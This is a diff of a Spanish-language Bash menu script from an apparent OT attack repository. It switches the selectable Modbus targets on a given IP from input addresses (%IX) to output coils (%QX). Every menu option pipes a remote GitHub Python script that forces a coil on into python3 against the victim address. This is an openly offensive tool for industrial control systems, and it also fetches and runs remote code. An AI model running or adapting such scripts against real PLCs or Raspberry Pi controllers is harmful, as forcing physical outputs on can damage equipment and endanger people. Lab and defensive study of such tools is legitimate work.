@@ -32,20 +32,17 @@ vIP="$1"
     fi
   menu=(dialog --checklist "La bobina de que entrada quieres mantener encendida?" 21 56 1)
     opciones=(
-      1 "%IX0.0" off
-      2 "%IX0.1" off
-      3 "%IX0.2" off
-      4 "%IX0.3" off
-      5 "%IX0.4" off
-      6 "%IX0.5" off
-      7 "%IX0.6" off
-      8 "%IX0.7" off
-      9 "%IX1.0" off
-     10 "%IX1.1" off
-     11 "%IX1.2" off
-     12 "%IX1.3" off
-     13 "%IX1.4" off
-     14 "%IX1.5" off
+      1 "%QX0.0" off
+      2 "%QX0.1" off
+      3 "%QX0.2" off
+      4 "%QX0.3" off
+      5 "%QX0.4" off
+      6 "%QX0.5" off
+      7 "%QX0.6" off
+      8 "%QX0.7" off
+      9 "%QX1.0" off
+     10 "%QX1.1" off
+     11 "%QX1.2" off
     )
   choices=$("${menu[@]}" "${opciones[@]}" 2>&1 >/dev/tty)
   for choice in $choices
@@ -55,126 +52,99 @@ vIP="$1"
         1)
 
           echo ""
-          echo "  Manteniendo encendida la bobina de la dirección %IX0.0..."
+          echo "  Manteniendo encendida la bobina de la dirección %QX0.0..."
           echo ""
-          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%IX0.0'
+          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%QX0.0'
 
         ;;
 
         2)
 
           echo ""
-          echo "  Manteniendo encendida la bobina de la dirección %IX0.1..."
+          echo "  Manteniendo encendida la bobina de la dirección %QX0.1..."
           echo ""
-          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%IX0.1'
+          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%QX0.1'
 
         ;;
 
         3)
 
           echo ""
-          echo "  Manteniendo encendida la bobina de la dirección %IX0.2..."
+          echo "  Manteniendo encendida la bobina de la dirección %QX0.2..."
           echo ""
-          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%IX0.2'
+          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%QX0.2'
 
         ;;
 
         4)
 
           echo ""
-          echo "  Manteniendo encendida la bobina de la dirección %IX0.3..."
+          echo "  Manteniendo encendida la bobina de la dirección %QX0.3..."
           echo ""
-          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%IX0.3'
+          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%QX0.3'
 
         ;;
 
         5)
 
           echo ""
-          echo "  Manteniendo encendida la bobina de la dirección %IX0.4..."
+          echo "  Manteniendo encendida la bobina de la dirección %QX0.4..."
           echo ""
-          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%IX0.4'
+          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%QX0.4'
 
         ;;
 
         6)
 
           echo ""
-          echo "  Manteniendo encendida la bobina de la dirección %IX0.5..."
+          echo "  Manteniendo encendida la bobina de la dirección %QX0.5..."
           echo ""
-          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%IX0.5'
+          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%QX0.5'
 
         ;;
 
         7)
 
           echo ""
-          echo "  Manteniendo encendida la bobina de la dirección %IX0.6..."
+          echo "  Manteniendo encendida la bobina de la dirección %QX0.6..."
           echo ""
-          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%IX0.6'
+          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%QX0.6'
 
         ;;
 
         8)
 
           echo ""
-          echo "  Manteniendo encendida la bobina de la dirección %IX0.7..."
+          echo "  Manteniendo encendida la bobina de la dirección %QX0.7..."
           echo ""
-          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%IX0.7'
+          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%QX0.7'
 
         ;;
 
         9)
 
           echo ""
-          echo "  Manteniendo encendida la bobina de la dirección %IX1.0..."
+          echo "  Manteniendo encendida la bobina de la dirección %QX1.0..."
           echo ""
-          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%IX1.0'
+          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%QX1.0'
 
         ;;
 
        10)
 
           echo ""
-          echo "  Manteniendo encendida la bobina de la dirección %IX1.1..."
+          echo "  Manteniendo encendida la bobina de la dirección %QX1.1..."
           echo ""
-          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%IX1.1'
+          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%QX1.1'
 
         ;;
 
        11)
 
           echo ""
-          echo "  Manteniendo encendida la bobina de la dirección %IX1.2..."
+          echo "  Manteniendo encendida la bobina de la dirección %QX1.2..."
           echo ""
-          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%IX1.2'
-
-        ;;
-
-       12)
-
-          echo ""
-          echo "  Manteniendo encendida la bobina de la dirección %IX1.3..."
-          echo ""
-          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%IX1.3'
-
-        ;;
-
-       13)
-
-          echo ""
-          echo "  Manteniendo encendida la bobina de la dirección %IX1.4..."
-          echo ""
-          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%IX1.4'
-
-        ;;
-
-       14)
-
-          echo ""
-          echo "  Manteniendo encendida la bobina de la dirección %IX1.5..."
-          echo ""
-          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%IX1.5'
+          curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Modbus-RBP-GPIO-ForzarEncendidoDeBobina.py | python3 - "$vIP" '%QX1.2'
 
         ;;
 
